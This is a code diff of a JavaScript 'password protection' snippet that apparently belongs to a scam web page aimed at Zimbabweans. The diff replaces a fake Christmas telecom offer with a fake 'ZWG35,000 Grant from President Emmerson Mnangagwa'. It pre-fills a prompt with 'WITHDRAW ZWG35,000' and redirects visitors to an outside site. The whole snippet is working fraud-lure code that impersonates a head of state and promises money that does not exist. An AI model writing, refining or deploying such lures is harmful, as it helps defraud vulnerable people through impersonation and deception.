@@ -1,10 +1,10 @@
   
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'GET XMAS OFFER'
+var password = 'WITHDRAW ZWG35,000'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive Christmas offer from your favourite network. Please press OK to Enter your Phone Number.',
-  'GET XMAS OFFER'
+  'SMS: Congratulations! You are eligible to receive the ZWG35,000 Christmas and new year Grant from President Emmerson Mnangagwa. Please press OK to withdraw CASH now.',
+  'WITHDRAW ZWG35,000'
 );
-if (password != 'GET XMAS OFFER') {
-  location.href = 'https://lhegit.org/zimbabwe.html';
+if (password != 'WITHDRAW ZWG35,000') {
+  location.href = 'https://lhegit.org/zimbabwe.html#1766572234732';
 }
